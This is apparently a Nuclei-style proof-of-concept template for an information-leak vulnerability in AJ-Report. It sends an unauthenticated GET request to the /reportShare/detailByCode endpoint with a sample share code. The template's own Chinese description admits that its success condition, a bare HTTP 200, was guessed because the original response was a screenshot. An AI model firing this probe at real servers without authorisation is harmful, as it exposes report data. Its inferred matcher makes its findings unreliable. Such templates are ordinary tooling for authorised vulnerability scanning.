id: poc-grvoad9yog10npov
info:
  name: AJ-Report-detailByCode-信息泄露漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: info-leak,2024
http:
- raw:
  - 'GET /reportShare/detailByCode?shareCode=QRK5ta8g HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    Connection: close

    Accept-Encoding: gzip'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
